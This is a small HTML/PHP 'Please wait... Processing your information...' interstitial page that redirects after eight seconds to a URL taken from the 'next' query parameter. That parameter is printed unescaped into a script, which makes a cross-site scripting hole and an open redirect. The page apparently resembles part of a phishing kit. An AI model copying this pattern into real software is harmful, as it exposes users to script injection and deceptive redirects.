<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>Wait</title>
</head>
<body>

<main>


    <div class="continer">

    <div class="logo1">
<img src="res/img/logo.png" >
</div>

<div class="col" >
<h3>Please wait...</h3>
</div>


<div class="col">
<p>Processing your information...</p>
<div class="loding"><img src="res/img/loadings.gif" style="width:60px;"></div>
 
</div>


</main>




<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script>
</body>
</html>